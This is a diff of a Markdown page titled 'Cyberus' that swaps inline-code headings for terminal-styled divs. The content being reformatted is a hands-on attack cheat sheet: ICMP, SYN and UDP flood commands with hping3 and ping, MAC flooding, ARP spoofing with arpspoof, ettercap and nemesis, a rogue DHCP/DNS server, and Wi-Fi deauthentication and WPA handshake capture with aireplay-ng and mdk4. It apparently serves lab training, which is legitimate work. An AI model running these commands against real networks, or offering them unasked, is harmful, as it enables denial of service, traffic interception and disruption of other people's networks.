@@ -22,19 +22,19 @@ title: Cyberus
 
 Install tool (if needed):
 
-#### `sudo apt install -y hping3`
+<div class="terminal"> sudo apt install -y hping3 </div>
 
 Fast ping flood:
 
-#### `sudo ping -f <target_ip>`
+<div class="terminal"> sudo ping -f <target_ip> </div>
 
 Large packet flood:
 
-#### `sudo ping -f -s 65000 <target_ip>`
+<div class="terminal"> sudo ping -f -s 65000 <target_ip> </div>
 
 Using hping3:
 
-#### `sudo hping3 --flood --icmp <target_ip>`
+<div class="terminal"> sudo hping3 --flood --icmp <target_ip> </div>
 
 **Flag Notes**
 
@@ -60,11 +60,11 @@ Try changing:
 
 Flood a service port (example: SSH):
 
-#### `sudo hping3 -S --flood -p 22 <target_ip>`
+<div class="terminal"> sudo hping3 -S --flood -p 22 <target_ip> </div>
 
 More aggressive:
 
-#### `sudo hping3 -S --flood --rand-source -p 22 <target_ip>`
+<div class="terminal"> sudo hping3 -S --flood --rand-source -p 22 <target_ip> </div>
 
 **Flag Notes**
 
@@ -88,7 +88,7 @@ Try changing:
 
 Flood a UDP port:
 
-#### `sudo hping3 --flood --udp -p 53 <target_ip>`
+<div class="terminal"> sudo hping3 --flood --udp -p 53 <target_ip> </div>
 
 **Flag Notes**
 
@@ -108,12 +108,11 @@ Try changing:
 
 Install tool:
 
-#### `sudo apt install -y dsniff`
+<div class="terminal"> sudo apt install -y dsniff </div>
 
 Run:
 
-#### `sudo macof -i `
-
+<div class="terminal"> sudo macof -i </div>
 **Flag Notes**
 
 - `-i` → selects network interface
@@ -132,19 +131,19 @@ Try changing:
 
 Install tools:
 
-#### `sudo apt install -y dsniff ettercap bettercap`
+<div class="terminal"> sudo apt install -y dsniff ettercap bettercap </div>
 
 Find gateway:
 
-#### `ip r`
+<div class="terminal"> ip r </div>
 
 Terminal 1:
 
-#### `sudo arpspoof -i -t <target_ip> <gateway_ip>`
+<div class="terminal"> sudo arpspoof -i -t <target_ip> <gateway_ip> </div>
 
 Terminal 2:
 
-#### `sudo arpspoof -i -t <gateway_ip> <target_ip>`
+<div class="terminal"> sudo arpspoof -i -t <gateway_ip> <target_ip> </div>
 
 **Flag Notes**
 
@@ -168,7 +167,7 @@ What is happening:
 
 Start:
 
-#### `sudo ettercap -G`
+<div class="terminal"> sudo ettercap -G </div>
 
 Steps:
 
@@ -194,9 +193,9 @@ Steps:
 
 Using nemesis:
 
-#### `sudo apt install -y nemesis`
+<div class="terminal"> sudo apt install -y nemesis </div>
 
-#### `sudo nemesis arp -v -d <target_ip> -S <fake_ip> -h <fake_mac>`
+<div class="terminal"> sudo nemesis arp -v -d <target_ip> -S <fake_ip> -h <fake_mac> </div>
 
 **Flag Notes**
 
@@ -220,11 +219,11 @@ Try changing:
 
 Install tool:
 
-#### `sudo apt install -y yersinia`
+<div class="terminal"> sudo apt install -y yersinia </div>
 
 Run interactive mode:
 
-#### `sudo yersinia -G`
+<div class="terminal"> sudo yersinia -G </div>
 
 Steps:
 
@@ -246,13 +245,13 @@ Steps:
 
 Install:
 
-#### `sudo apt install -y dnsmasq`
+<div class="terminal"> sudo apt install -y dnsmasq </div>
 
 Example minimal config:
 
 Edit:
 
-#### `sudo nano /etc/dnsmasq.conf`
+<div class="terminal"> sudo nano /etc/dnsmasq.conf </div>
 
 Add:
 
@@ -270,7 +269,7 @@ dhcp-option=6,<fake_dns_ip>
 
 Restart:
 
-#### `sudo systemctl restart dnsmasq`
+<div class="terminal"> sudo systemctl restart dnsmasq </div>
 
 **What the options mean**
 
@@ -286,11 +285,11 @@ Restart:
 
 ## Monitor wireless interfaces
 
-#### `iwconfig`
+<div class="terminal"> iwconfig </div>
 
 Enable monitor mode:
 
-#### `sudo airmon-ng start wlan0`
+<div class="terminal"> sudo airmon-ng start wlan0 </div>
 
 **What this does**
 
@@ -300,7 +299,7 @@ Enable monitor mode:
 
 ## Find targets
 
-#### `sudo airodump-ng wlan0mon`
+<div class="terminal"> sudo airodump-ng wlan0mon </div>
 
 Record:
 
@@ -320,11 +319,11 @@ Record:
 
 ## Deauth a client
 
-#### `sudo aireplay-ng --deauth 20 -a -c <client_mac> wlan0mon`
+<div class="terminal"> sudo aireplay-ng --deauth 20 -a -c <client_mac> wlan0mon </div>
 
 Deauth entire AP:
 
-#### `sudo aireplay-ng --deauth 50 -a wlan0mon`
+<div class="terminal"> sudo aireplay-ng --deauth 50 -a wlan0mon </div>
 
 **Flag Notes**
 
@@ -344,11 +343,11 @@ Try changing:
 
 Install:
 
-#### `sudo apt install -y mdk4`
+<div class="terminal"> sudo apt install -y mdk4 </div>
 
 Run:
 
-#### `sudo mdk4 wlan0mon d -B `
+<div class="terminal"> sudo mdk4 wlan0mon d -B </div>
 
 **Flag Notes**
 
@@ -364,7 +363,7 @@ Run:
 
 Start capture:
 
-#### `sudo airodump-ng -c --bssid -w capture wlan0mon`
+<div class="terminal"> sudo airodump-ng -c --bssid -w capture wlan0mon </div>
 
 Leave running.
 
@@ -380,7 +379,7 @@ Leave running.
 
 ## Force reconnect to capture handshake
 
-#### `sudo aireplay-ng --deauth 10 -a wlan0mon`
+<div class="terminal"> sudo aireplay-ng --deauth 10 -a wlan0mon </div>
 
 Watch for:
 
@@ -402,7 +401,7 @@ capture.csv
 
 Open:
 
-#### `wireshark capture.cap`
+<div class="terminal"> wireshark capture.cap </div>
 
 **What you are verifying**
 
@@ -416,19 +415,18 @@ Open:
 
 Find interface:
 
-#### `ip addr`
-
+<div class="terminal"> ip addr </div>
 Find gateway:
 
-#### `ip r`
+<div class="terminal"> ip r </div>
 
 Find active traffic:
 
-#### `sudo iftop -i `
+<div class="terminal"> sudo iftop -i </div>
 
 Watch packets:
 
-#### `sudo tcpdump -i `
+<div class="terminal"> sudo tcpdump -i </div>
 
 **What these tell you**
 
